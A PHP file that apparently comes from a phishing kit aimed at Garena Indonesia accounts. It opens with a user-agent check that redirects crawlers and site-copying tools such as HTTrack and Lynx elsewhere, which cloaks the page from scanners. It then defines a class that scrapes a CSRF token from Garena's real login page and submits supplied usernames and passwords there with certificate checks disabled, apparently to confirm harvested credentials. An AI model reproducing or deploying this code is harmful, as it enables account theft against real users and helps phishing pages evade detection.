<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}
?>

<?php 

/*****

Name : Garena Indonesia True Login Class
Author : SUCKZ - ANAMPEDIA - DARKNETHOST
Facebook : https://www.facebook.com/package.json

Do not change this section script kiddies :)

***/

$darknethost = new DARKNETHOST();

class DARKNETHOST {

	const __ENDPOINT__ = "http://gcms2.garena.com/login/";

	protected $username;
	protected $password;
	protected $hash;

	public function getMessage($username, $password, $hash){

		return self::sendToServer($username, $password, $hash);

	}

	protected function sendToServer($username, $password, $hash){

		$this->username = $username;
		$this->password = $password;
		$this->hash = $hash;

		$params = array(
			'csrfmiddlewaretoken' => $this->hash,
			'next' => '/home',
			'password' => 'garena_gcms_pass',
			'username' => $this->username,
			'password2' => $this->password
		);

		return self::http(self::__ENDPOINT__, http_build_query($params));
	}

	public function fetchToken(){

		return self::pisahin("<input type='hidden' name='csrfmiddlewaretoken' value='","' />", self::http('http://gcms2.garena.com/login/'));

	}

	protected function pisahin($var1="", $var2="", $pool){

		$temp1 = strpos($pool,$var1)+strlen($var1);
		$result = substr($pool,$temp1,strlen($pool));
		$dd=strpos($result,$var2);
		if($dd == 0){
			$dd = strlen($result);
		}

		return substr($result,0,$dd);
	}

	protected function http($url,$post=false, $headers=false){

		$cookie = "/darknethost_garenaID.txt";
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().$cookie);
		curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().$cookie);
		if($post){
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}
		if($headers)
		{
			curl_setopt ($ch, CURLOPT_HEADER, 0);
			curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
		}
		$response = curl_exec($ch);
		curl_close($ch);
		return  $response;
	}

}